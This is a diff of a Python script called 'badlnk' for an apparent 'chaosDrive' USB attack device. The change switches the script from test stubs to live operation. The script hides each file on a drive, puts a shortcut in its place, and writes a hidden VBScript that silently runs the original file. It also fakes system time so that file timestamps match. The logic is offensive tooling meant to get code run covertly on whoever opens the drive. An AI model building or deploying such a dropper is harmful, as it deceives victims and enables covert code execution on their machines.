@@ -8,29 +8,6 @@ badlnk alchemy script for chaosDrive
   attacker's desire
 """
 
-"""
-Algo:
-- Check templates directory for available templates by extension
-- Set system time from target directory
-- Set sttgt = 1
-- Start vbscript generation
-- Get file list from target directory; for each file:
-    - Does extension match available template
-        - YES:
-            - Create "backup" directory
-            - Mark directory as hidden
-            - Copy lnk template to target directory
-            - rename to match target file
-            - set lnk sttgt number to match target file
-            - move target file to backup
-            - Add case statement to vbscript
-            - Time stomp lnk file to match target file (?)
-- Add vbscript closer
-- Write vbscript to target directory
-- Mark as hidden
-- Done (?)            
-"""
-
 # Imports
 import argparse
 import os
@@ -42,17 +19,17 @@ def getAvailTemplates(templateDir="./templates"):
     lnk_dict = {}
     for filename in os.listdir(templateDir):
         if filename.endswith(".lnk"):
-            print "found file: {}".format(filename)
+            #print "found file: {}".format(filename)
             lnk_dict[filename.split('.')[1]]=filename
         else:
             continue
     
-    print lnk_dict
+    #print lnk_dict
     return lnk_dict
 
 def setSystemTime(targetDir):
-    print "TESTING setSystemTime called"
-    return
+    #print "TESTING setSystemTime called"
+    
     f = subprocess.check_call(["/etc/chaos/fakentp.sh","-f",targetDir])
     return
 
@@ -67,6 +44,8 @@ def vbscript_case(sttgt, filename):
     # Returns case statement entry like:
     # case "sttgt"
     # CreateObject("WScript.Shell").Run """filename""", 0, False
+    # Need to replace forward slashes with backslashes
+    filename = filename.replace("/","\\")
     snippet = 'case "{}"\n'.format(sttgt)
     snippet += 'CreateObject("WScript.Shell").Run """{}""", 0, False\n'.format(filename)
     return snippet
@@ -97,8 +76,7 @@ def renamefile(src,dst):
     return
 
 def setHiddenAttr(filename):
-    print "TESTING setHiddenAttr called"
-    return
+    #print "TESTING setHiddenAttr called"
     f = subprocess.check_call(["fatattr","+h",filename])
     return
 
@@ -139,7 +117,7 @@ def doBadLnk():
             copyfile(src,dst)
             
             # set lnk sttgt number to match target file
-            sttgt_str = '{:05d}'.format(sttgt)
+            sttgt_str = '{:04d}'.format(sttgt)
             setLnkTarget(dst,sttgt_str)
             sttgt += 1
             
@@ -179,23 +157,18 @@ def vbtest():
     
 
 
-"""
-description = 'Alchemy test for chaosDrive'
+
+description = 'BadLnk  for chaosDrive'
 parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter)
 parser.add_argument('--publicLUN', type=str)
 parser.add_argument('--secretLUN', type=str)
 
 args = parser.parse_args()
 
-print args.publicLUN
-print args.secretLUN
-
-f = open(args.publicLUN+"/kilroyWasHere.txt", "w")
-f.close()
-"""
-
-publicLUN="/Users/mrich/Documents/code/ChaosDrive/PocketBeagle/badlnk/testlun"
-template_dir = "/Users/mrich/Documents/code/ChaosDrive/PocketBeagle/badlnk/templates"
+#publicLUN="/Users/mrich/Documents/code/ChaosDrive/PocketBeagle/badlnk/testlun"
+#template_dir = "/Users/mrich/Documents/code/ChaosDrive/PocketBeagle/badlnk/templates"
+publicLUN=args.publicLUN
+template_dir = "/etc/chaos/badlnk/templates"
 
 #vbtest()
 doBadLnk()
